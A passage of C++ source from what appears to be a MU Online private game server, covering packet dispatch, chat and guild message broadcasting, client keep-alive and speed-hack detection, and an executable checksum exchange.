					PCShop.BuyItem(&gObj[aIndex],aRecv[4]);
				}
#endif

				if((aRecv[1] == 0x04) && (aRecv[3] == 0x07))
				{
					QuestTeleport(aIndex,0);
				}
				else if((aRecv[1] == 0x04) && (aRecv[3] == 0x08))
				{
					QuestTeleport(aIndex,1);
				}
			break;
			case 0xE1:
				CGGuildAssignStatus((PMSG_GUILD_ASSIGN_STATUS_REQ *)aRecv, aIndex);
				break;
			case 0xE2:
				CGGuildAssignType((PMSG_GUILD_ASSIGN_TYPE_REQ *)aRecv, aIndex);
				break;
			case 0xE5:
				CGRelationShipReqJoinBreakOff((PMSG_RELATIONSHIP_JOIN_BREAKOFF_REQ *)aRecv, aIndex);
				break;
			case 0xE6:
				CGRelationShipAnsJoinBreakOff((PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS *)aRecv, aIndex);
				break;
			case 0xE9:
				CGUnionList((PMSG_UNIONLIST_REQ *)aRecv, aIndex);
				break;
			case 0xEB:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x01:
							CGRelationShipReqKickOutUnionMember((PMSG_KICKOUT_UNIONMEMBER_REQ *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0x71:
				GCPingSendRecv((PMSG_PING_RESULT *)aRecv, aIndex);
				break;
			case 0x72:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					GCPacketCheckSumRecv((PMSG_PACKETCHECKSUM *)aRecv, aIndex);
				}
				break;
			case 0x73:
				if ( DataEncryptCheck(aIndex, protoNum, Encrypt) != FALSE )
				{
					GCNPggCheckSumRecv((PMSG_NPROTECTGGCHECKSUM *)aRecv, aIndex);
				}
				break;
			case 0x81:
				CGWarehouseMoneyInOut(aIndex, (PMSG_WAREHOUSEMONEYINOUT *)aRecv);
				break;
			case 0x82:
				CGWarehouseUseEnd(aIndex);
				break;
			case 0x83:
				GCWarehouseRecivePassword(aIndex, (PMSG_WAREHOUSEPASSSEND *)aRecv);
				break;
			case 0x86:
				CGChaosBoxItemMixButtonClick((PMSG_CHAOSMIX *)aRecv, aIndex);
				break;
			case 0x87:
				CGChaosBoxUseEnd(aIndex);
				break;
			case 0x90:
				GCReqmoveDevilSquare((PMSG_REQ_MOVEDEVILSQUARE *)aRecv, aIndex);
				break;
			case 0x91:
				GCReqDevilSquareRemainTime((PMSG_REQ_DEVILSQUARE_REMAINTIME *)aRecv, aIndex);
				break;
			case 0x95:
				GCRegEventChipRecv((PMSG_REGEVENTCHIP *)aRecv, aIndex);
				break;
			case 0x96:
				GCGetMutoNumRecv((PMSG_GETMUTONUMBER *)aRecv, aIndex);
				break;
			case 0x97:
				GCUseEndEventChipRescv(aIndex);
				break;
			case 0x98:
				GCUseRenaChangeZenRecv((PMSG_EXCHANGE_EVENTCHIP *)aRecv, aIndex);
				break;
			case 0x99:
				CGReqMoveOtherServer((PMSG_REQ_MOVE_OTHERSERVER *)aRecv, aIndex);
				break;
			case 0xA0:
				CGRequestQuestInfo(aIndex);
				break;
			case 0xA2:
				CGSetQuestState((PMSG_SETQUEST *)aRecv, aIndex);
				break;
			case 0xA7:
				CGRequestPetItemCommand((PMSG_REQUEST_PET_ITEM_COMMAND *)aRecv, aIndex);
				break;
			case 0xA9:
				CGRequestPetItemInfo((PMSG_REQUEST_PET_ITEMINFO *)aRecv, aIndex);
				break;
			case 0xAA:
				g_DuelManager.ProtocolCore(&gObj[aIndex],aRecv);
				break;
			case 0x9A:
				CGRequestEnterBloodCastle((PMSG_REQ_MOVEBLOODCASTLE*)aRecv, aIndex);
				break;
			case 0x9B:
				//#error LAcking PACKET HERE
				break;
			case 0x9F:
				CGRequestEventEnterCount((PMSG_REQ_CL_ENTERCOUNT *)aRecv, aIndex);
				break;
			case 0x9D:
				CGRequestLottoRegister((PMSG_REQ_2ANV_LOTTO_EVENT *)aRecv, aIndex);
				break;
			case 0xAF:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x01:
							CGRequestEnterChaosCastle((PMSG_REQ_MOVECHAOSCASTLE *)aRecv, aIndex);
							break;
						case 0x02:
							CGRequestRepositionUserInChaosCastle((PMSG_REQ_REPOSUSER_IN_CC *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0xC0:
				FriendListRequest(aIndex);
				break;
			case 0xC1:
				FriendAddRequest((PMSG_FRIEND_ADD_REQ *)aRecv, aIndex);
				break;
			case 0xC2:
				WaitFriendAddRequest((PMSG_FRIEND_ADD_SIN_RESULT *)aRecv, aIndex);
				break;
			case 0xC3:
				FriendDelRequest((PMSG_FRIEND_DEL_REQ *)aRecv, aIndex);
				break;
			case 0xC4:
				FriendStateClientRecv((PMSG_FRIEND_STATE_C *)aRecv, aIndex);
				break;
			case 0xC5:
				{
					if(ReadConfig.IsEngProtocol == 0)
						FriendMemoSend((PMSG_FRIEND_MEMO *)aRecv, aIndex);
					else
						FriendMemoSend_Eng((PMSG_FRIEND_MEMO_ENG *)aRecv, aIndex);
				}break;
			case 0xC7:
				FriendMemoReadReq((PMSG_FRIEND_READ_MEMO_REQ *)aRecv, aIndex);
				break;
			case 0xC8:
				FriendMemoDelReq((PMSG_FRIEND_MEMO_DEL_REQ *)aRecv, aIndex);
				break;
			case 0xC9:
				FriendMemoListReq(aIndex);
				break;
			case 0xCA:
				FriendChatRoomCreateReq((PMSG_FRIEND_ROOMCREATE_REQ *)aRecv, aIndex);
				break;
			case 0xCB:
				FriendRoomInvitationReq((PMSG_ROOM_INVITATION *)aRecv, aIndex);
				break;
			case 0xD1:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

					switch ( lpDef->subcode )
					{
						case 0x00:
							CGReqKanturuStateInfo((PMSG_REQ_KANTURU_STATE_INFO *)aRecv, aIndex);
							break;
						case 0x01:
							GCReqEnterKanturuBossMap((PMSG_REQ_ENTER_KANTURU_BOSS_MAP *)aRecv, aIndex);
							break;
					}
				}
				break;
			case 0xD2:
				{		
					
#if (ENABLE_CSHOP == 1)
					MuItemShop.ProtocolCore(aIndex,aRecv);
#endif
				}break;
		/*	case 0xF3:
				{
					PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;
					LogAdd("Codes: %x %x %x",lpDef->subcode, aRecv[4], aRecv[5]);
					switch (lpDef->subcode)
					{
					case 0x15:
						return;
					}
					break;
				}*/
			case 0xF5:
				{
					if(g_bUseCashShop == TRUE)
					{
						PMSG_DEFAULT2 * lpDef = (PMSG_DEFAULT2 *)aRecv;

						switch ( lpDef->subcode )
						{
							case 0x01:
								g_CashShop.CGCashShopOpen(lpObj, (PMSG_REQ_CASHSHOPOPEN *)aRecv);
								break;
							case 0x03:
								g_CashShop.CGCashPoint(lpObj);
								break;
							case 0x05:
								g_CashShop.GCCashItemListSend(&gObj[aIndex], (PMSG_REQ_CASHITEMLIST *)aRecv);
								break;
							case 0x07:
								g_CashShop.CGCashItemBuy(&gObj[aIndex], (PMSG_REQ_CASHITEM_BUY *)aRecv);
								break;
						}
					}
				}
				break;
			case 0xF6: //S5 New Protocol on LogIn C1 04 F6 65
				{
					qs5.ProtocolCore(aIndex,(char *)aRecv);
					//BYTE buff[41] = { 0xC1 , 41 , 0xF6 , 0x0a,0,1,1,1,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31};
					//DataSend(lpObj->m_Index, buff, sizeof(buff));
				}
				break;
			case 0xF7: //Enter Imperial Guardian Request
					g_ImperialGuardian.CheckLetterItem(&gObj[aIndex]);
				break;
			case 0xF8: //S5 New Protocol on LogIn C1 04 F6 65
				{
					//PMSG_TEST * lpDef = (PMSG_TEST *)aRecv;
					//int a;
					//a=4;
					//DataSend(lpObj->m_Index ,(UCHAR*)aRecv, aRecv[1]);
					Gens.ProtocolCore(aIndex,(char *)aRecv);
				}
				break;
			case 0x8E: //M Window in S5
					CGMWindowRecv((PMSG_MWINDOW *)aRecv, aIndex);
				break;
			case 0xfe:
				{
					//New protocol shit
				}break;
			default:
				LogAddC(2, "error-L2 : account:%s name:%s HEAD:%x (%s,%d) State:%d",
					gObj[aIndex].AccountID, gObj[aIndex].Name, protoNum, __FILE__, __LINE__, gObj[aIndex].Connected);
				//CloseClient(aIndex);


		}	
#if (CRYSTAL_EDITION == 1)
		}
#endif
	}
#if(PROXY_SHOW == 1)
	WriteProxyPacket(aIndex,aRecv,aLen,0);
#endif
}






void TestSend()
{
	PMSG_TEST pMsg;
	int size = sizeof(pMsg);
	pMsg.h.c = 0xC2;
	pMsg.h.headcode = 0xFF;	// Test Packet
	pMsg.h.sizeH = SET_NUMBERH(size);
	pMsg.h.sizeL = SET_NUMBERL(size);
	DataSend( tempindex, (LPBYTE)&pMsg, size);
	DataSend( tempindex, (LPBYTE)&pMsg, size);
	LogAdd("TEST Data Send");
}

void MsgSendV2(LPOBJ lpObj, unsigned char* Msg, int size)
{
	for ( int n=0;n<MAX_VIEWPORT;n++)
	{
		if ( lpObj->VpPlayer2[n].type == OBJ_USER )
		{
			if ( lpObj->VpPlayer2[n].state != 0 )
			{
				DataSend(lpObj->VpPlayer2[n].number, Msg, size);
			}
		}
	}
}

void MsgSendDistNear2(unsigned char* Msg, int size, int map, int x, int y, int dist)
{
	for ( int i = OBJ_STARTUSERINDEX ; i < OBJMAX ; i ++ )
	{
		if (gObjIsConnected(i) == FALSE)
			continue;

		LPOBJ lpTargetObj = &gObj[i];

		if (lpTargetObj->MapNumber == map)
		{
			if (( lpTargetObj->X <= x + dist) && (lpTargetObj->X >= x - dist ))
			{
				if ((lpTargetObj->Y <= (y + dist)) && (lpTargetObj->Y >= (y - dist)))
				{
					DataSend(i, Msg, size);
				}
			}
		}
	}
}
void MsgSendDistNear(LPOBJ lpObj, unsigned char* Msg, int size, int dist)
{
	for ( int i = OBJ_STARTUSERINDEX ; i < OBJMAX ; i ++ )
	{
		if (gObjIsConnected(i) == FALSE)
			continue;

		LPOBJ lpTargetObj = &gObj[i];

		if (lpTargetObj->MapNumber == lpObj->MapNumber)
		{
			if (( lpTargetObj->X <= lpObj->X + dist) && (lpTargetObj->X >= lpObj->X - dist ))
			{
				if ((lpTargetObj->Y <= (lpObj->Y + dist)) && (lpTargetObj->Y >= (lpObj->Y - dist)))
				{
					DataSend(i, Msg, size);
				}
			}
		}
	}
}


void CGLiveClient(PMSG_CLIENTTIME * lpClientTime, short aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].Connected > PLAYER_CONNECTED )
	{
#if (CRYSTAL_PING==0)	
		gObj[aIndex].ConnectCheckTime = GetTickCount();
#else
		PMSG_SET_DEVILSQUARE pMsg={0};
		PHeadSetB((LPBYTE)&pMsg, 0xE0, sizeof(pMsg));
		pMsg.Type=0x99;

		DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
#endif
	}

	if ( gObj[aIndex].CheckSpeedHack != false )
	{
		int systemtick = GetTickCount() - gObj[aIndex].CheckTick2;
		int usertick = lpClientTime->Time - gObj[aIndex].CheckTick;
		int checktime = systemtick - usertick;

		if ( checktime < -7000 )
		{
			LogAddTD(lMsg.Get(MSGGET(1, 214)), gObj[aIndex].AccountID, gObj[aIndex].Name, checktime);
			CloseClient(aIndex);
		}

		gObj[aIndex].CheckTickCount++;

		if ( gObj[aIndex].CheckTickCount > 45 )
		{
			gObj[aIndex].CheckTick = lpClientTime->Time;
			gObj[aIndex].CheckTickCount = 0;
		}
	}

	if ( gObj[aIndex].Connected == PLAYER_PLAYING )
	{
#if (PACK_EDITION>=3)
#if (CRYSTAL_EDITION == 1)
		if(CrystalWall.UseCrystalShield == 1)
		{
			if(CrystalWall.Crystal_IsAntiSpeedHack == 1)
			{
				if(lpClientTime->MagicSpeed > (gObj[aIndex].m_MagicSpeed + CrystalWall.Crystal_IsAntiSpeedHack_MaxDif))
				{
					CW_HACK_LOG.Output("[%s][%s][%s] ClientHack Detected : Editing MagicSpeed [%d/%d]",
						gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Ip_addr,
						gObj[aIndex].m_MagicSpeed,lpClientTime->MagicSpeed);
					
					gObj[aIndex].m_DetectCount++;

					if(gObj[aIndex].m_DetectCount > CrystalWall.Crystal_IsAntiSpeedHack_MinDet)
						CrystalWall.Action(aIndex,6);
				}
				if(lpClientTime->AttackSpeed > (gObj[aIndex].m_AttackSpeed + CrystalWall.Crystal_IsAntiSpeedHack_MaxDif))
				{
					CW_HACK_LOG.Output("[%s][%s][%s] ClientHack Detected : Editing AttackSpeed [%d/%d]",
						gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Ip_addr,
						gObj[aIndex].m_AttackSpeed,lpClientTime->AttackSpeed);
					
					gObj[aIndex].m_DetectCount++;

					if(gObj[aIndex].m_DetectCount > CrystalWall.Crystal_IsAntiSpeedHack_MinDet)
						CrystalWall.Action(aIndex,6);
				}
			}
		/*	if ( gObj[aIndex].m_AttackSpeed < lpClientTime->AttackSpeed || gObj[aIndex].m_MagicSpeed < lpClientTime->MagicSpeed )
			{
				if(ReadConfig.AHLog == TRUE)
				{
					ANTI_HACK_LOG.Output("[%s][%s][%s] ClientHack Detected : Editing AttackSpeed [%d][%d] [%d][%d]",
						gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Ip_addr,
						gObj[aIndex].m_AttackSpeed, lpClientTime->AttackSpeed, gObj[aIndex].m_MagicSpeed,
						lpClientTime->MagicSpeed);
				}
				gObj[aIndex].m_AttackSpeedHackDetectedCount++;


				if ( gObj[aIndex].m_AttackSpeedHackDetectedCount > 3 )
				{
					CloseClient(aIndex);
				}
			}
			else
			{
				gObj[aIndex].m_AttackSpeedHackDetectedCount = 0;
			}
		*/
		}
#endif
#endif
	}
	
}



struct PMSG_CHECK_MAINEXE
{
	PBMSG_HEAD h;	// C1:03
	WORD m_wKey;	// 4
};



void GCCheckMainExeKeySend(int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	PMSG_CHECK_MAINEXE pMsg;

	gObj[aIndex].CheckSumTableNum = rand() % MAX_CHECKSUM_KEY;
	gObj[aIndex].CheckSumTime = GetTickCount();
	PHeadSetB((LPBYTE)&pMsg, 0x03, sizeof(pMsg));
	pMsg.m_wKey = EncryptCheckSumKey(gObj[aIndex].CheckSumTableNum);

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}







WORD EncryptCheckSumKey(WORD wSource)
{
	WORD wRandom = rand() % 64;
	WORD wAcc = ((wSource & 0x3F0) * 64) | (wRandom *16) | (wSource & 0x0F);
	return wAcc ^ 0xB479;
}






void CGCheckMainRecv(PMSG_CHECK_MAINEXE_RESULT * lpMsg, int aIndex)
{
	//if ( strcmp(gObj[aIndex].Ip_addr, "5.143.207.22") == 0 )	// #warning To Prevent HAckrs
	//{
	//	gObj[aIndex].CheckSumTime = 0;
	//	gObj[aIndex].m_InWebzen = true;
	//	return;
	//}

	/*if ( gObj[aIndex].CheckSumTableNum < 0 || gObj[aIndex].CheckSumTableNum > MAX_CHECKSUM_KEY-1 )
	{
		LogAdd("error-L1 : [%s][%s] CheckSum-Exe error ", gObj[aIndex].AccountID, gObj[aIndex].Name);
		CloseClient(aIndex);
		return;
	}*/

	if(ReadConfig.isCheckSum == TRUE)
	{
		if ( dwgCheckSum[gObj[aIndex].CheckSumTableNum] != lpMsg->m_dwKey)
		{
			LogAddTD("error-L1 : CheckSum-Exe error %d %d %d [%s]", dwgCheckSum[gObj[aIndex].CheckSumTableNum],
				lpMsg->m_dwKey, gObj[aIndex].CheckSumTableNum, gObj[aIndex].AccountID);
			CloseClient(aIndex);
			return;
		}
	}

	gObj[aIndex].CheckSumTime = 0;
}







void PEchoProc(unsigned char * aMsg, int aLen, short aIndex)
{
	for ( int n = 0 ; n< OBJMAX ; n++)
	{
		if ( gObj[n].Connected >= PLAYER_CONNECTED )
		{
			DataSend(n, aMsg, aLen);
		}
	}
}










void GCResultSend(int aIndex, BYTE headcode, BYTE result)
{
	PMSG_DEFRESULT pResult;

	PHeadSetB((LPBYTE)&pResult, headcode, sizeof(pResult));
	pResult.result = result;
	
	DataSend(aIndex, (UCHAR*)&pResult, pResult.h.size);
}




void ChatSend(LPOBJ lpObj, char* szChat)
{
	int len = strlen(szChat);

	if ( len < 1 )
		return;

	if ( len > MAX_CHAT_LEN-1 )
		return;

/*	char szTempMsg[4096] = {0};
	MultiByteToWideChar(1258, 0, szChat, len, (unsigned short *)szTempMsg, sizeof(szTempMsg));
	memcpy(&pMsg.szChatMsg, szTempMsg, sizeof(pMsg.szChatMsg));
	pMsg.szChatMsg[MAX_CHAT_LEN-2]=0;
	pMsg.szChatMsg[MAX_CHAT_LEN-1]=0;
	PHeadSetB((LPBYTE)&pMsg, 0x01, wcslen((unsigned short*)pMsg.szChatMsg)*2 + (sizeof(GC_CHATSEND)-sizeof(pMsg.szChatMsg)));
	pMsg.sIndex[0] = lpObj->m_Index >> 8;
	pMsg.sIndex[1] = lpObj->m_Index & 0xFF;*/

	PMSG_CHATDATA_NUMBER pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x01, len+6);
	strcpy(pMsg.chatmsg, szChat);
	pMsg.NumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.NumberL = SET_NUMBERL(lpObj->m_Index);

	MsgSendV2(lpObj, (UCHAR*)&pMsg, pMsg.h.size);
}





void vChatSend(LPOBJ lpObj, char* szChat, ...)
{
	__try
	{
	char szBuffer[256] = "";
	va_list pArguments;

	va_start(pArguments, szChat);
	vsprintf(szBuffer, szChat, pArguments);
	va_end(pArguments);

	int len = strlen(szBuffer);

	if ( len < 1 )
		return;

	if ( len > MAX_CHAT_LEN-1 )
		return;

/*	char szTempMsg[4096] = {0};
	MultiByteToWideChar(1258, 0, szChat, len, (unsigned short*)szTempMsg, sizeof(szTempMsg));
	memcpy(&pMsg.szChatMsg, szTempMsg, sizeof(pMsg.szChatMsg));
	pMsg.szChatMsg[MAX_CHAT_LEN-2]=0;
	pMsg.szChatMsg[MAX_CHAT_LEN-1]=0;
	PHeadSetB((LPBYTE)&pMsg, 0x01, wcslen((unsigned short*)pMsg.szChatMsg)*2 + (sizeof(GC_CHATSEND)-sizeof(pMsg.szChatMsg)));
	pMsg.sIndex[0] = lpObj->m_Index >> 8;
	pMsg.sIndex[1] = lpObj->m_Index & 0xFF;*/

	PMSG_CHATDATA_NUMBER pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x01, len+6);
	strcpy(pMsg.chatmsg, szBuffer);
	pMsg.NumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.NumberL = SET_NUMBERL(lpObj->m_Index);

	MsgSendV2(lpObj, (UCHAR*)&pMsg, pMsg.h.size);

	}__except( EXCEPTION_ACCESS_VIOLATION == GetExceptionCode() )
	{
	}
}







void AllSendServerMsg( char* chatmsg)
{
	PMSG_NOTICE pNotice;
	pNotice.type = 0;	// 3
	pNotice.btCount = 0;	// 4
	pNotice.wDelay = 0;	// 6	
	pNotice.dwColor = 0;	// 8
	pNotice.btSpeed = 0;	// C
	
	TNotice::MakeNoticeMsg((TNotice*)&pNotice, 0x00,  chatmsg);

	for ( int n = OBJ_STARTUSERINDEX ; n < OBJMAX ; n++)
	{
		if ( gObj[n].Connected == PLAYER_PLAYING )
		{
			if ( gObj[n].Type == OBJ_USER )
			{
				DataSend(n, (unsigned char*)&pNotice , pNotice.h.size );
			}
		}
	}
}





void DataSendAll(unsigned char* lpMsg, int iMsgSize)
{			
	for ( int n = OBJ_STARTUSERINDEX ; n < OBJMAX ; n++)
	{
		if ( gObj[n].Connected == PLAYER_PLAYING )
		{
			if ( gObj[n].Type == OBJ_USER )
			{
				DataSend(n, (unsigned char*)lpMsg , iMsgSize );
			}
		}
	}
}






void ChatTargetSend(LPOBJ lpObj, char * szChat, int senduser)
{
	int len = strlen(szChat);

	if ( len < 1 || len > MAX_CHAT_LEN-1)
		return;

	/*char szTempMsg[4096] = {0};
	MultiByteToWideChar(1258, 0, szChat, len, (unsigned short*)szTempMsg, sizeof(szTempMsg));
	memcpy(&pMsg.szChatMsg, szTempMsg, sizeof(pMsg.szChatMsg));
	pMsg.szChatMsg[MAX_CHAT_LEN-2]=0;
	pMsg.szChatMsg[MAX_CHAT_LEN-1]=0;
	PHeadSetB((LPBYTE)&pMsg, 0x01, wcslen((unsigned short*)pMsg.szChatMsg)*2 + (sizeof(GC_CHATSEND)-sizeof(pMsg.szChatMsg)));
	pMsg.sIndex[0] = lpObj->m_Index >> 8;
	pMsg.sIndex[1] = lpObj->m_Index & 0xFF;*/

	PMSG_CHATDATA_NUMBER pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x01, len+6);
	strcpy(pMsg.chatmsg, szChat);
	pMsg.NumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.NumberL = SET_NUMBERL(lpObj->m_Index);
	pMsg.chatmsg[len+1] = 0;

	DataSend(senduser, (UCHAR*)&pMsg, pMsg.h.size);
}


void PChatProc(PMSG_CHATDATA * lpChat, short aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	int n;
	LPOBJ lpObj = &gObj[aIndex];
	int number;
	int slen = strlen(lpChat->chatmsg);

	if ( slen < 1 )
		return;

	if ( slen > MAX_CHAT_LEN-1 )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[Anti-HACK][PChatProc][%s][%s] Chat Message Len : %d", lpObj->AccountID, lpObj->Name, slen);
			ANTI_HACK_LOG.Output("[Anti-HACK][PChatProc][%s][%s] MSG : %s", lpObj->AccountID, lpObj->Name, lpChat->chatmsg);
		}
		return;
	}

	char szId[MAX_ACCOUNT_LEN+1];
	szId[MAX_ACCOUNT_LEN] = 0;

	memcpy(szId, gObj[aIndex].Name, MAX_ACCOUNT_LEN);
	memcpy(lpChat->chatid, szId, MAX_ACCOUNT_LEN);

	switch ( lpChat->chatmsg[0] )
	{
		case '!':	// Global Announcement
			if ( slen > 2 )
			{
				if ( (lpObj->AuthorityCode&1)==1)
				{
					DataSend(aIndex, (LPBYTE)lpChat, lpChat->h.size);
					if(ReadConfig.SCFPSON == FALSE)
						AllSendServerMsg(&lpChat->chatmsg[1]);
					else
						SCFAllServerMsgSend(&lpChat->chatmsg[1]);
					if(ReadConfig.GMLog == TRUE)
						GM_LOG.Output(lMsg.Get(MSGGET(1, 215)), gObj[aIndex].AccountID, gObj[aIndex].Name, &lpChat->chatmsg[1]);

					return;
				}
			}
			break;

		case '/':	// Command
			if ( slen > 2 )
			{
				strcmp(&lpChat->chatmsg[1], "¿Ãµø ƒÆ∏Æ∏∂");	// #warning Deathway Translation
				cManager.ManagementProc(lpObj, lpChat->chatmsg, aIndex);
				return;
			}
			break;
	}

	

	// Other Commands
	if ( lpObj->ChatLimitTime > 0 )
	{
		MsgOutput(lpObj->m_Index, lMsg.Get(MSGGET(4, 223)), lpObj->ChatLimitTime);
		return;
	}

	if ( (lpObj->Penalty&2)==2)
		return;

	// Party Message
	if ( lpChat->chatmsg[0] == '~' || lpChat->chatmsg[0] == ']' )
	{
		if ( lpObj->PartyNumber >= 0 )
		{
			int partycount = gParty.GetPartyCount(lpObj->PartyNumber);

			if ( partycount >= 0 )
			{
				for (n=0;n<MAX_USER_IN_PARTY;n++ )
				{
					number = gParty.m_PartyS[lpObj->PartyNumber].Number[n];

					if ( number >= 0 )
					{
						DataSend(number, (LPBYTE)lpChat, lpChat->h.size);
					}
				}
			}
		}
	}
	//GENS CHAT:
	else if ( lpChat->chatmsg[0] == '$')
	{
		if(ReadConfig.S6E2 == 1)
		{
			if ( lpObj->GensFam != 0 )
			{
				for ( int n = OBJ_STARTUSERINDEX ; n < OBJMAX ; n++)
				{
					if ( gObj[n].Connected == PLAYER_PLAYING )
					{
						if ( gObj[n].Type == OBJ_USER )						
						{
							if(gObj[n].GensFam == lpObj->GensFam)
								DataSend(n, (LPBYTE)lpChat, lpChat->h.size);
						}
					}
				}
			}
		}
	}
	// Guild
	else if ( lpChat->chatmsg[0] == '@' )
	{
		if ( lpObj->GuildNumber > 0 )
		{
			// Notice
			if ( lpChat->chatmsg[1] == '>' )
			{
				if ( lpObj->Name[0] == lpObj->lpGuild->Names[0][0] )
				{
					if ( !strcmp(lpObj->Name, lpObj->lpGuild->Names[0] ) )
					{
						StringReplace(&lpChat->chatmsg[0],60,0x27,0x22);
						StringReplace(&lpChat->chatmsg[0],60,0x60,0x22);
						StringReplace(&lpChat->chatmsg[0],60,0x3B,0x2C);

						GDGuildNoticeSave(lpObj->lpGuild->Name, &lpChat->chatmsg[2]);
						LogAdd(lMsg.Get(MSGGET(1, 216)), lpObj->lpGuild->Name, lpChat->chatmsg);
					}
				}
			}
			// Aliances
			else if ( lpChat->chatmsg[1] == '@' && lpObj->lpGuild->iGuildUnion )
			{
				int iGuildCount = 0;
				int iGuildList[MAX_UNION_GUILD] ={0};

				if ( UnionManager.GetGuildUnionMemberList(lpObj->lpGuild->iGuildUnion, iGuildCount, iGuildList) == TRUE )
				{
					for ( int i=0;i<iGuildCount;i++)
					{
						_GUILD_INFO_STRUCT *lpGuildInfo = Guild.SearchGuild_Number(iGuildList[i]);

						if ( !lpGuildInfo )
							continue;

						for (n=0;n<MAX_USER_GUILD;n++)
						{
							if ( lpGuildInfo->Use[n] )
							{
								number = lpGuildInfo->Index[n];

								if ( number >= 0 )
								{
									if ( lpGuildInfo->Names[n][0] == gObj[number].Name[0] )
									{
										if ( !strcmp(lpGuildInfo->Names[n], gObj[number].Name ))
										{
											DataSend(number, (LPBYTE)lpChat, lpChat->h.size);
										}
									}
								}
							}
						}
					}
				}

				if ( g_iServerGroupUnionChatting == TRUE )
					GDUnionServerGroupChattingSend(lpObj->lpGuild->iGuildUnion, lpChat);
			}
			// Just Guild
			else
			{
				int count = lpObj->lpGuild->Count;

				if ( count >= 0 )
				{
					for ( n=0;n<MAX_USER_GUILD;n++)
					{
						if ( lpObj->lpGuild->Use[n] )
							{
								number = lpObj->lpGuild->Index[n];

								if ( number >= 0 )
								{
									if ( lpObj->lpGuild->Names[n][0] == gObj[number].Name[0] )
									{
										if ( !strcmp(lpObj->lpGuild->Names[n], gObj[number].Name ) )
										{
											DataSend(number, (LPBYTE)lpChat, lpChat->h.size);
										}
									}
								}
							}
						}
				}

				if ( g_iServerGroupGuildChatting == TRUE ) // xD? ?? ??
				{
					if ( lpObj->lpGuild->Count > 1 )
					{
						GDGuildServerGroupChattingSend(lpObj->lpGuild->Number, lpChat);
					}
				}
			}
		}
	}
	else
	{
		DataSend(aIndex, (LPBYTE)lpChat, lpChat->h.size);
		MsgSendV2(lpObj, (LPBYTE)lpChat, lpChat->h.size);
	}

	if(ReadConfig.GMLog == TRUE)
	{
		if (lpObj->AuthorityCode > 0)
		{
			GM_LOG.Output("[MSG][%s][%s] %s", lpObj->AccountID, lpObj->Name, lpChat->chatmsg);
		} else {
			BYTE isGMAround = 0;
			for ( int n=0;n<MAX_VIEWPORT;n++)
			{
				if ( lpObj->VpPlayer2[n].type == OBJ_USER )
				{
					if ( lpObj->VpPlayer2[n].state != 0 )
					{
						if (gObj[lpObj->VpPlayer2[n].number].AuthorityCode > 0)
						{
							isGMAround = 1;
						}
					}
				}
			}
			if (isGMAround == 1)
			{
				GM_LOG.Output("[MSG][%s][%s] %s", lpObj->AccountID, lpObj->Name, lpChat->chatmsg);
			}
		}
	}
	if(ReadConfig.MSGLog == TRUE)
		POST_LOG.Output("[MSG][%s][%s] %s", lpObj->AccountID, lpObj->Name, lpChat->chatmsg);
}							
			


void CGChatRecv(PMSG_CHATDATA_NUMBER * lpMsg, int aIndex)
{
	LPOBJ lpObj = &gObj[aIndex];

	if ( PacketCheckTime(lpObj) == FALSE )
	{
		return;
	}

	lpMsg->NumberH = HIWORD(lpObj->m_Index);	//CHAT CHEAT DARKAV FIX
	lpMsg->NumberL = LOWORD(lpObj->m_Index);	//CHAT CHEAT DARKAV FIX

	DataSend(aIndex, (LPBYTE)lpMsg, lpMsg->h.size);
	MsgSendV2(lpObj, (LPBYTE)lpMsg, lpMsg->h.size);

	//#if (WL_PROTECT==1)  
	//	VM_START_WITHLEVEL(18)
	//	if(WLRegGetStatus(NULL) != 1)
	//	{
	//		ReadConfig.gObjLevelUpGralNormal = 1;
	//	}
	//	VM_END
	//#endif

	if(ReadConfig.GMLog == TRUE)
	{
		if (lpObj->AuthorityCode > 0)
		{
			GM_LOG.Output("[CHAT][%s][%s] %s", lpObj->AccountID, lpObj->Name, lpMsg->chatmsg);
		}
	}
	if(ReadConfig.MSGLog == TRUE)
		POST_LOG.Output("[CHAT][%s][%s] %s", lpObj->AccountID, lpObj->Name, lpMsg->chatmsg);
}





struct PMSG_SERVERMSG
{
	PBMSG_HEAD h;	// C1:0C
	BYTE MsgNumber;	// 3
};


void GCServerMsgSend(BYTE msg, int aIndex)
{
	PMSG_SERVERMSG pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0C, sizeof(pMsg));
	pMsg.MsgNumber = msg;
	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}

void GCFireWorks(BYTE Map, BYTE X, BYTE Y) 
{
	for ( int n = OBJ_STARTUSERINDEX ; n < OBJMAX ; n++)
	{
		if ( gObj[n].Connected == PLAYER_PLAYING )
		{
			if (( gObj[n].Type  == OBJ_USER ) && ( gObj[n].MapNumber == Map))
			{
				GCServerCmd(gObj[n].m_Index, 0, X, Y);
			}
		}
	}
}

